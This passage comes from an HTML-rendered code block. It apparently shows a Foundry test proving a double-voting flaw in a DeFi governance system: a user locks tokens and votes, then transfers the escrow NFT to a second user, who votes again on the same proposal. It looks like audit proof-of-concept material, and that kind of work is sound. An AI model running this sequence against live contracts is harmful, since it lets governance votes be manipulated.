class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etest_doubleSpendCastVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eadmin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_initialize\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eclaimants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//zero % ownership of top protcols\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserABal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblack\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk11\"\u003etype\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003emax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreate_lock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1_000_000e18\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e4\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e365\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edays\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e3600\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eminterUpgradeable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabi\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eencodeWithSelector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIMinter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enudge\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eselector\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epropose\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etargets\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evalues\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldatas\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Nudge proposal\u0026quot;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eskip\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003evotingDelay\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() +\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecastVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagainstVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        )= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Against Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagainstVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;For Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Abstain Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evotingEscrow\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estopPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evm\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estartPrank\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euserB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecastVote\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e         (\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagainstVotes2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes2\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        )= \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblackGovernor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eproposalVotes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Against Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagainstVotes2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;For Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eforVotes2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Abstain Votes: \u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eabstainVotes2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan 